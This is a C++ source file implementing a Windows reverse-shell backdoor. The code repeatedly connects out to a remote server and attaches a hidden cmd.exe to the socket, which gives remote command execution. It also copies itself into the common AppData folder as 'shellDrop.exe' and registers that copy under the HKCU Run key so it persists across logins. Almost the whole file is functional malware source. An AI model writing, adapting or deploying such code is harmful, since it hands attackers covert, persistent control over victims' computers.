#include "../include/shell.h"

#include <iostream>

Shell::Shell()
{
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        throw std::runtime_error("WSAStartup failed");
    }
}

Shell::~Shell()
{
    WSACleanup();
}

SOCKET Shell::createSocket()
{
    SOCKET connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (connectSocket == INVALID_SOCKET)
    {
        throw std::runtime_error("Failed to create socket");
    }
    return connectSocket;
}

void Shell::cleanupSocket(SOCKET& socket)
{
    closesocket(socket);
}

void Shell::handleConnection(SOCKET& connectSocket)
{
    const int DEFAULT_BUFLEN = 512;
    char recvbuf[DEFAULT_BUFLEN];
    int recvCode;

    if ((recvCode = recv(connectSocket, recvbuf, sizeof(recvbuf), 0)) <= 0)
    {
        throw std::runtime_error("Connection closed or error in receiving data");
    }

    std::string command = "cmd.exe";
    STARTUPINFO sinfo{};
    PROCESS_INFORMATION pinfo{};
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)connectSocket;
    sinfo.wShowWindow = SW_HIDE;

    if (!CreateProcess(nullptr, &command[0], nullptr, nullptr, TRUE, 0, nullptr, nullptr, &sinfo, &pinfo))
    {
        throw std::runtime_error("Failed to create process");
    }

    CloseHandle(sinfo.hStdInput);
    CloseHandle(sinfo.hStdOutput);
    CloseHandle(sinfo.hStdError);

    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

void Shell::connectToServer(const std::string& remoteServer, int port)
{
    const int DEFAULT_BUFLEN = 512;
    char recvbuf[DEFAULT_BUFLEN];
    int recvCode;

    while (true)
    {
        Sleep(500);

        SOCKET connectSocket = createSocket();
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(remoteServer.c_str());
        addr.sin_port = htons(port);

        if (connect(connectSocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
        {
            cleanupSocket(connectSocket);
            std::cerr << "Failed to connect to server." << std::endl;
            continue;
        }

        try
        {
            handleConnection(connectSocket);
        }
        catch (const std::exception& e)
        {
            std::cerr << e.what() << std::endl;
        }

        cleanupSocket(connectSocket);
        
        if (strcmp(recvbuf, "exit\n") == 0)
        {
            break;
        }
    }
}

void Shell::enablePersistence()
{
    char currentExePath[MAX_PATH];
    if (GetModuleFileName(NULL, currentExePath, MAX_PATH) == 0)
    {
        std::cerr << "Failed to get current executable path" << std::endl;
    }

    char path[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path) != S_OK)
    {
        std::cerr << "Failed to get common appdata path" << std::endl;
    }

    std::string exePath = std::string(path) + "\\shellDrop.exe";

    if (!CopyFile(currentExePath, exePath.c_str(), FALSE))
    {
        DWORD error = GetLastError();
        std::cerr << "Failed to copy executable to persistence location. Error code: " << error << std::endl;
    }

    std::cout << "Executable copied to: " << exePath << std::endl;

    HKEY hkey = nullptr;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    if (createStatus != ERROR_SUCCESS)
    {
        std::cerr << "Failed to create registry key. Error code: " << createStatus << std::endl;
    }

    LONG status = RegSetValueEx(hkey, "shellDrop", 0, REG_SZ, (BYTE*)exePath.c_str(), (exePath.size() + 1) * sizeof(char));
    RegCloseKey(hkey);

    if (status != ERROR_SUCCESS)
    {
        std::cerr << "Failed to set registry value. Error code: " << status << std::endl;
    }

    std::cout << "Registry value set successfully." << std::endl;
}
